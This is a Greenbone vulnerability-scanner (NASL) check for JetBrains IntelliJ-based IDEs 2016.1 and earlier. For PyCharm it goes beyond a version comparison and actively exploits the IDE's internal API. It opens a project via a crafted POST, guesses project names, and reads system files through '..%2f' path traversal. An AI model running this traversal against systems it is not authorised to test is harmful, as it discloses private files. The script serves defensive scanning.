# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:jetbrains:jetbrains";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107231");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2017-08-25 10:25:40 +0530 (Fri, 25 Aug 2017)");

  script_tag(name:"qod_type", value:"exploit");
  script_name("JetBrains IntelliJ-based IDEs <= 2016.1 Multiple Vulnerabilities - Active Check");

  script_tag(name:"summary", value:"JetbBains IntelliJ-based IDEs are prone to a remote code
  execution (RCE) and a local file disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Checks if a vulnerable version is present on the target host.
  If the IDE is Pycharm, sends a crafted request via HTTP GET and POST and checks the responses.");

  script_tag(name:"insight", value:"Multiple flaws are due to Over-permissive CORS settings that
  allows attackers to use a malicious website in order to access various internal API endpoints,
  gain access to data saved by the IDE, and gather various meta-information like IDE version or open
  a project.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to read
  arbitrary files on the target system.");

  script_tag(name:"affected", value:"JetBrains IntelliJ-based IDE releases 2016.1 and prior.");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more
  information.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://blog.saynotolinux.com/blog/2016/08/15/jetbrains-ide-remote-code-execution-and-local-file-disclosure-vulnerability-analysis/");
  script_xref(name:"URL", value:"https://blog.jetbrains.com/blog/2016/05/11/security-update-for-intellij-based-ides-v2016-1-and-older-versions/");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_jetbrains_ide_detection.nasl", "os_detection.nasl");
  script_mandatory_keys("jetBrains/installed", "jetBrains/ide");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("host_details.inc");
include("os_func.inc");
include("version_func.inc");

function guessProjectName(port) {

  local_var port;
  local_var dictionary, name, url, req, res;

  dictionary = make_list("ideas",
                         "purescript",
                         "image-analogies",
                         "powerline-shell",
                         "python-oauth2",
                         "create",
                         "jquery-boilerplate",
                         "sqlbrite",
                         "foresight.js",
                         "iOS-Core-Animation-Advanced-Techniques",
                         "elemental",
                         "peek",
                         "TheAmazingAudioEngine",
                         "orientdb",
                         "testing");

  foreach name(dictionary) {
    url = "/" + name + "/.idea/workspace.xml";
    req = http_get_req(port:port, url:url, add_headers:make_array("Content-Type", "application/xml"));
    res = http_keepalive_send_recv(port:port, data:req);
    if(res && res =~ "^HTTP/1\.[01] 200")
      break;
  }

  if(!isnull(name))
    return name;
  else
    return;
}

function buildDotsSegsToRoot(path) {

  local_var path;
  local_var i, depth, dotSegs;

  i = 0;
  depth = 0;
  while(i < strlen(path)) {
    if(path[i] == "/")
      depth += 1;
    i++;
  }

  for(i = 0; i < depth; i++)
    dotSegs += "..%2f";

  return dotSegs;
}

function leakWithPyCharmHelpers(homePath, port, check_files) {

  local_var homePath, port, check_files;
  local_var projectName, projectPath, url, data, req, res, dotSegs, pattern, file, report;

  projectName = "helpers";
  projectPath = homePath + "/helpers";
  url = "/api/internal";
  data = '{"url": "jetbrains://whatever/open//' + projectPath + '"}';

  req = http_post_put_req(port:port, url:url, data:data,
                          add_headers:make_array("Content-Type", "application/x-www-form-urlencoded"));
  res = http_keepalive_send_recv(port:port, data:req);

  dotSegs = buildDotsSegsToRoot(path:projectPath);

  foreach pattern(keys(check_files)) {

    file = check_files[pattern];
    url = "/helpers" + "/" + dotSegs + file;

    if(http_vuln_check(port:port, url:url, pattern:pattern, check_header:TRUE)) {
      report = http_report_vuln_url(port:port, url:url) + '\n\n';
      return report;
    }
  }
}

function leakWithProject(name, port, check_files) {

  local_var name, port, check_files;
  local_var dotSegs, i, pattern, file, url, report;

  dotSegs = "";
  for(i = 1; i < 5; i++) {

    dotSegs += "..%2f";
    foreach pattern(keys(check_files)) {

      file = check_files[pattern];
      url = "/" + name + "/" + dotSegs + file;

      if(http_vuln_check(port:port, url:url, pattern:pattern, check_header:TRUE)) {
        report = http_report_vuln_url(port:port, url:url) + '\n\n';
        return report;
      }
    }
  }
  return;
}

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!ide = get_kb_item("jetBrains/ide"))
  exit(0);

version = get_app_version(cpe:CPE, port:port, nofork:TRUE);
if(version) {
  if(version_is_less_equal(version:version, test_version:"2016.1"))
    jetbrains_report = report_fixed_ver(installed_version:version, fixed_version:"See Vendor advisory");
}

if(ide =~ "^PyCharm") {

  checkFiles = traversal_files();

  # Active Exploit will be executed if the helpers project or one of the projects listed in Dictionary exist in the Installation of PyCharm.
  homePath = get_kb_item("jetBrains/homepath");

  if(!isnull(homePath))
    Pycharm_report = leakWithPyCharmHelpers(homePath:homePath, port:port, check_files:checkFiles);
  else {
    ProjectName = guessProjectName(port:port);
    if(!isnull(ProjectName))
      Pycharm_report = leakWithProject(name:ProjectName, port:port, check_files:checkFiles);
  }
}

if(!isnull(Pycharm_report) || jetbrains_report) {
  if(isnull( Pycharm_report))
    report = jetbrains_report;
  else
    report = Pycharm_report + "\n" + jetbrains_report;

  security_message(port:port, data:report);
  exit(0);
}

exit(99);
